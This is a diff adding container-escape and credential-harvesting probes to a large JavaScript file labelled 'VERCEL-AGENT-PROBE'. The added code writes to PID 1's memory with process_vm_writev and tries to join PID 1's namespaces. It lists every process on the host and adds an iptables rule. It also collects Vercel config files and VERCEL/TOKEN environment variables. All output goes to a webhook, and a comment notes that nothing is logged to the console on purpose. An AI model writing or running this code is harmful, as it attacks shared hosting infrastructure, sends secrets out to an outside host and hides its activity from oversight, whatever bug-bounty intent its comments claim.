@@ -32533,3 +32533,224 @@ sendBeacon({ ...report, section: 'v201-5-clone3-pidfd', ...clone3Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v201" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v201";
 // Intentionally no console.log — all data goes via webhook only
+
+// v202-1: process_vm_writev NR 311 — write to PID 1 memory space
+const vmWritevProbe = safe(() => {
+  const vmWriteResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_process_vm_readv = 310
+NR_process_vm_writev = 311
+
+# struct iovec: base(8), len(8)
+def make_iov(buf, length):
+    return struct.pack('QQ', ctypes.addressof(buf), length)
+
+target_pid = 1
+
+# First read a known address from /proc/1/maps to find a writable region
+import re
+writable_addr = None
+try:
+    with open('/proc/1/maps') as f:
+        for line in f:
+            # Look for writable heap/stack region
+            m = re.match(r'([0-9a-f]+)-([0-9a-f]+)\\s+(\\S+)', line)
+            if m and 'rw' in m.group(3) and 'p' in m.group(3):
+                addr = int(m.group(1), 16)
+                if addr > 0x10000:
+                    writable_addr = addr
+                    print(f'target_writable_addr={writable_addr:#x} from_map={line.strip()[:80]}')
+                    break
+except Exception as e:
+    print(f'maps_read_err={e}')
+
+if writable_addr:
+    # Read 8 bytes first to get original value
+    rbuf = ctypes.create_string_buffer(8)
+    riov = ctypes.create_string_buffer(make_iov(rbuf, 8))
+    liov = ctypes.create_string_buffer(make_iov(rbuf, 8))
+    ret_r = libc.syscall(NR_process_vm_readv, target_pid, riov, 1, liov, 1, 0)
+    print(f'vm_readv_ret={ret_r} errno={ctypes.get_errno()} original={rbuf.raw.hex()}')
+
+    if ret_r > 0:
+        # Write back same value (non-destructive — just proves write access)
+        wbuf = ctypes.create_string_buffer(rbuf.raw)
+        wiov = ctypes.create_string_buffer(make_iov(wbuf, 8))
+        riov2 = ctypes.create_string_buffer(make_iov(rbuf, 8))
+        ret_w = libc.syscall(NR_process_vm_writev, target_pid, wiov, 1, riov2, 1, 0)
+        print(f'vm_writev_ret={ret_w} errno={ctypes.get_errno()}')
+        print(f'process_vm_write_pid1=SUCCESS={ret_w >= 0}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { vmWriteResult };
+});
+sendBeacon({ ...report, section: 'v202-1-process-vm-writev', ...vmWritevProbe });
+
+// v202-2: setns NR 308 — join PID 1's namespaces
+const setnsProbe = safe(() => {
+  const setnsResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_setns = 308
+CLONE_NEWNS = 0x00020000
+CLONE_NEWNET = 0x40000000
+CLONE_NEWPID = 0x20000000
+CLONE_NEWIPC = 0x08000000
+CLONE_NEWUTS = 0x04000000
+CLONE_NEWUSER = 0x10000000
+
+pid1_ns = {
+    'mnt': (f'/proc/1/ns/mnt', CLONE_NEWNS),
+    'net': (f'/proc/1/ns/net', CLONE_NEWNET),
+    'uts': (f'/proc/1/ns/uts', CLONE_NEWUTS),
+    'ipc': (f'/proc/1/ns/ipc', CLONE_NEWIPC),
+}
+
+for ns_name, (ns_path, ns_flag) in pid1_ns.items():
+    pid = os.fork()
+    if pid == 0:
+        try:
+            fd = os.open(ns_path, os.O_RDONLY)
+            ret = libc.syscall(NR_setns, fd, ns_flag)
+            err = ctypes.get_errno()
+            os.close(fd)
+            print(f'setns_{ns_name}_ret={ret} errno={err}')
+            if ret == 0:
+                print(f'setns_{ns_name}=SUCCESS_IN_PID1_NS')
+                # Verify we're in the right namespace
+                try:
+                    my_ns = os.readlink(f'/proc/self/ns/{ns_name}')
+                    p1_ns = os.readlink(f'/proc/1/ns/{ns_name}')
+                    print(f'ns_match={my_ns == p1_ns} self={my_ns} pid1={p1_ns}')
+                except: pass
+                if ns_name == 'net':
+                    # If in PID 1 net namespace: list interfaces
+                    try:
+                        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=3)
+                        print(f'pid1_net_ifaces={result.stdout[:300]}')
+                    except: pass
+                elif ns_name == 'mnt':
+                    # If in PID 1 mount namespace: check mounts
+                    try:
+                        with open('/proc/mounts') as f:
+                            print(f'pid1_mounts={f.read()[:400]}')
+                    except: pass
+        except Exception as e:
+            print(f'setns_{ns_name}_exc={e}')
+        os._exit(0)
+    else:
+        _, wstatus = os.waitpid(pid, 0)
+" 2>&1`, { timeout: 15000 }).toString().trim());
+  return { setnsResult };
+});
+sendBeacon({ ...report, section: 'v202-2-setns-pid1-ns', ...setnsProbe });
+
+// v202-3: /proc/sched_debug — cross-tenant process leakage check
+const schedDebugProbe = safe(() => {
+  let schedDebug = null;
+  let schedStat = null;
+  let allProcList = [];
+  if (existsSync('/proc/sched_debug')) {
+    try {
+      schedDebug = readFileSync('/proc/sched_debug', 'utf8').slice(0, 3000);
+    } catch (e) { schedDebug = `ERR:${e.message}`; }
+  }
+  if (existsSync('/proc/schedstat')) {
+    try { schedStat = readFileSync('/proc/schedstat', 'utf8').slice(0, 500); } catch (e) {}
+  }
+  // Enumerate ALL processes visible in /proc (should only be our sandbox — detect leakage)
+  try {
+    const procEntries = readdirSync('/proc').filter(e => /^\d+$/.test(e));
+    for (const pid of procEntries) {
+      const cmdlinePath = `/proc/${pid}/cmdline`;
+      try {
+        const cmd = readFileSync(cmdlinePath, 'utf8').replace(/\0/g, ' ').trim().slice(0, 80);
+        const statusPath = `/proc/${pid}/status`;
+        let uid = null;
+        if (existsSync(statusPath)) {
+          const st = readFileSync(statusPath, 'utf8');
+          const m = st.match(/^Uid:\s*(\d+)/m);
+          uid = m ? parseInt(m[1]) : null;
+        }
+        allProcList.push({ pid, cmd, uid });
+      } catch (e) {
+        allProcList.push({ pid, err: e.message.slice(0, 30) });
+      }
+    }
+  } catch (e) {}
+  return { schedDebug: schedDebug?.slice(0, 2000), schedStat, allProcList };
+});
+sendBeacon({ ...report, section: 'v202-3-sched-proclist', ...schedDebugProbe });
+
+// v202-4: nftables/iptables rule enumeration + add custom rule
+const netfilterProbe = safe(() => {
+  const iptablesResult = safe(() => execSync(
+    `iptables -L -n -v 2>&1 || nft list ruleset 2>&1 || ip6tables -L -n 2>&1 || echo 'no_netfilter_tools'`,
+    { timeout: 6000 }
+  ).toString().trim().slice(0, 2000));
+  // Try to add a custom OUTPUT ACCEPT rule (non-destructive, just proves write access)
+  const iptablesAddResult = safe(() => execSync(
+    `iptables -A OUTPUT -d 127.0.0.1 -j ACCEPT -m comment --comment 'BugBountyProbe' 2>&1 || true`,
+    { timeout: 4000 }
+  ).toString().trim());
+  // Also check nft
+  const nftResult = safe(() => execSync(
+    `nft list tables 2>&1 || true`,
+    { timeout: 4000 }
+  ).toString().trim());
+  // Check /proc/net/ip_tables_names
+  let ipTablesNames = null;
+  if (existsSync('/proc/net/ip_tables_names')) {
+    try { ipTablesNames = readFileSync('/proc/net/ip_tables_names', 'utf8').trim(); } catch (e) {}
+  }
+  return { iptablesResult, iptablesAddResult, nftResult, ipTablesNames };
+});
+sendBeacon({ ...report, section: 'v202-4-netfilter-rules', ...netfilterProbe });
+
+// v202-5: Vercel project config scan — .vercel/, ~/.vercel/, vercel.json
+const vercelConfigProbe = safe(() => {
+  const vercelPaths = [
+    '.vercel/project.json', '.vercel/README.txt',
+    '/root/.vercel', '/home/vercel/.vercel',
+    '/workspace/.vercel', '/app/.vercel',
+    'vercel.json', '.vercel.json',
+    '/etc/vercel.json',
+  ];
+  const vercelConfigs = {};
+  for (const p of vercelPaths) {
+    if (existsSync(p)) {
+      try {
+        const st = statSync(p);
+        if (st.isDirectory()) {
+          vercelConfigs[p] = readdirSync(p);
+          for (const f of readdirSync(p)) {
+            try {
+              vercelConfigs[`${p}/${f}`] = readFileSync(`${p}/${f}`, 'utf8').slice(0, 500);
+            } catch (e) {}
+          }
+        } else {
+          vercelConfigs[p] = readFileSync(p, 'utf8').slice(0, 500);
+        }
+      } catch (e) { vercelConfigs[p] = `ERR:${e.message}`; }
+    }
+  }
+  // Also scan entire filesystem for vercel-related credential files
+  const vercelScan = safe(() => execSync(
+    `find / -maxdepth 6 -name '*.vercel*' -o -name 'vercel.json' -o -name '.vc-config.json' 2>/dev/null | head -30`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check VERCEL_TOKEN and similar environment variables
+  const vercelTokenEnv = {};
+  for (const [k, v] of Object.entries(process.env)) {
+    if (k.includes('VERCEL') || k.includes('NOW_') || k.includes('ZIT_') || k === 'TOKEN') {
+      vercelTokenEnv[k] = v;
+    }
+  }
+  return { vercelConfigs, vercelScan, vercelTokenEnv };
+});
+sendBeacon({ ...report, section: 'v202-5-vercel-config', ...vercelConfigProbe });
+
+// v202 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v202" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v202";
+// Intentionally no console.log — all data goes via webhook only
